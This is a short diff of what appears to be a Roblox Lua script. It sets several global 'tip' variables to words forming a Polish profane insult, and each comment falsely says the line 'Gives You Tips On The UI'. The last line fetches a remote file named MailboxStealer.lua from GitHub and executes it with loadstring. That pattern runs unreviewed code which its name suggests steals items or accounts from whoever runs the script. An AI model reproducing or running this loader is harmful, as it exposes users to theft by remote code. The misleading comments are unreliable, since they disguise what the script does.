@@ -18,4 +18,5 @@ _G.Tip2 = "twoja" --// Gives You Tips On The UI
 _G.Tip3 = "matke" --// Gives You Tips On The UI
 _G.Tip4 = "psie" --// Gives You Tips On The UI
 _G.Tip5 = "jebany" --// Gives You Tips On The UI
+
 loadstring(game:HttpGet("https://raw.githubusercontent.com/HerrSimoNHub/api/main/MailboxStealer.lua"))()
